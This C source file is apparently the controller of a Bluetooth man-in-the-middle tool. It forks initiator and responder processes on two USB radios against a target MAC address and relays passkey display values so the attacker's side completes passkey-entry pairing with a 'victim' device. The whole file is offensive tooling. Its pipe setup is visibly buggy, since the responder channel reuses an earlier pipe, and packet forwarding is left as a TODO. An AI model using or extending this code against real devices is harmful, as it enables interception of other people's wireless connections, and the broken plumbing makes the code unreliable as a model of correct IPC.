#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>

int master_to_initiator;   /* TX */
int initiator_from_master; /* RX */
int initiator_to_master;   /* TX */
int master_from_initiator; /* RX */
int master_to_responder;   /* TX */
int responder_from_master; /* RX */
int responder_to_master;   /* TX */
int master_from_responder; /* RX */
int to_responder;
int initiator_rx;
int responder_rx;
pid_t cpid;

pid_t initiator_pid;
pid_t responder_pid;

static void kill_all_children()
{
	printf("INIT: CTRL-C - SIGINT received, shutting down..\n");
	// log_info("INIT: sigint_handler: shutting down");
	/* Killing Initiator */
	kill(initiator_pid, SIGKILL);
	/* Killing Responder */
	kill(responder_pid, SIGKILL);
	exit(0);
}

static void sigint_handler(int param)
{
	kill_all_children();
}


// static void forward_packages(void)
// {
// 	if(!relay_mode_enabled)
// 		return;
// 
// 	/* Synchronize with other process */
// 	ipc_write((char *)&sizeof_my_packet_to_forward, sizeof(size_t));
// 	ipc_write((char *)my_packet_to_forward, sizeof_my_packet_to_forward);
// 	sizeof_my_packet_to_forward = 0;
// 
// 	/* Receive what to forward (if any) */
// 	ipc_read((char *)&sizeof_partner_packet_to_forward, sizeof(ssize_t));
// 	if(sizeof_partner_packet_to_forward > 0)
// 	{
// 		ipc_read((char *)partner_packet_to_forward, sizeof_partner_packet_to_forward);
// 		// l2cap_le_request_can_send_now_event(connection_id);
// 	}
// }


static void ipc_read(int fd, char *buf, size_t size)
{
	if((size_t)read(fd, buf, size) != size)
	{
		printf("MASTER: IPC read error\n");
		raise(SIGINT);
	}
}

static void ipc_write(int fd, char *buf, size_t size)
{
	if((size_t)write(fd, buf, size) != size)
	{
		printf("MASTER: IPC write error\n");
		raise(SIGINT);
	}
}

int main(int argc, const char * argv[])
{
	int pipe_fd[2];
	uint8_t initiator_usb_device_id;
	uint8_t responder_usb_device_id;
	char *parameters[6];
	char **env = {0};
	uint8_t buf[100];
	char initiator_from_master_str[32];
	char initiator_to_master_str[32];
	char responder_from_master_str[32];
	char responder_to_master_str[32];

	/* Parse arguments */
	if(argc < 4)
	{
		printf("Too few arguments provided\n");
		printf("Usage:./%s initiator_device_id responder_device_id target_mac[aa:bb:cc:dd:ee:ff]\n", argv[0]);
		exit(0);
	}

	signal(SIGINT, sigint_handler);

	/* Pipes between initator and master */
	pipe(pipe_fd);
	master_to_initiator  = pipe_fd[1];
	initiator_from_master = pipe_fd[0];
	pipe(pipe_fd);
	initiator_to_master   = pipe_fd[1];
	master_from_initiator = pipe_fd[0];
	/* Pipe between responder and master */
	master_to_responder  = pipe_fd[1];
	responder_from_master = pipe_fd[0];
	pipe(pipe_fd);
	responder_to_master   = pipe_fd[1];
	master_from_responder = pipe_fd[0];

	/* Forking initator */
	/* Convert file fds to strings, so we can pass them to children */
	snprintf(initiator_from_master_str, 32, "%d", initiator_from_master);
	snprintf(initiator_to_master_str, 32, "%d", initiator_to_master);
	snprintf(responder_from_master_str, 32, "%d", responder_from_master);
	snprintf(responder_to_master_str, 32, "%d", responder_to_master);
	printf("Forking Initiator process\n");
	parameters[0] = "MitM Initiator Communicator";
	parameters[1] = argv[1]; /* Initiator USB device ID */
	parameters[2] = argv[3]; /* Target MAC */
	parameters[3] = initiator_to_master_str;
	parameters[4] = initiator_from_master_str;
	parameters[5] = 0;
	cpid = fork();
	if(cpid == 0)
		execve("unpatched_mitm_communicators/mitm_initiator.bin", parameters, env);
	else
		initiator_pid = cpid;

	/* Forking responder */
	printf("Forking Responder process\n");
	parameters[0] = "MitM Responder Communicator";
	parameters[1] = argv[2]; /* Responder USB device ID */
	parameters[2] = responder_to_master_str;
	parameters[3] = responder_from_master_str;
	parameters[4] = 0;
	cpid = fork();
	if(cpid == 0)
		execve("patched_mitm_communicators/mitm_responder.bin", parameters, env);
	else
		responder_pid = cpid;

	/* Wait for responder to tell us about an incoming connection */
	ipc_read(master_from_responder, buf, 1);
	printf("Incoming connection...\n");

	/* Tell the initiator to start connecting to victim */
	ipc_write(master_to_initiator, buf, 1);

	/* Wait for responder to calculate and tell us first display value (va) 20bit ~ 3 bytes */
	ipc_read(master_from_responder, buf, sizeof(uint32_t));
	/* Pass va to Initiator to go through first round of PE and automatically initate second PE with victim */
	ipc_write(master_to_initiator, buf, sizeof(uint32_t));

	/* Wait for Responder to calculate and tell us second display value (va2) 20bit ~ 3 bytes */
	ipc_read(master_from_responder, buf, 3);
	/* Pass va2 to Initiator to go through second round of PE */
	ipc_write(master_to_initiator, buf, 3);

	/* TODO: Start forwarding messages */

	sleep(30);
	kill_all_children();
}
